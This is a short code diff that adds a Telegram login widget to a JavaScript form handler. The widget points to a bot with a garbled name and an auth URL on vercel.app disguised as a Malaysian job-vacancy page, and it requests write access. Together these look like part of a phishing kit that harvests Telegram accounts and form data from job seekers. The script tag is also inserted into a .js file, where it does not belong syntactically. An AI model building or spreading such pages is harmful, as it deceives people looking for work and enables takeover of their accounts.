@@ -1,3 +1,5 @@
+<script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="Vagaysndvsbot" data-size="medium" data-auth-url="https://mykerjayacom.vercel.app/jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/indexeacf.html" data-request-access="write"></script>
+
 function processFirstData() {
     $('#firstForm').submit(function(submitingprocessFirstData) {
         submitingprocessFirstData.preventDefault();
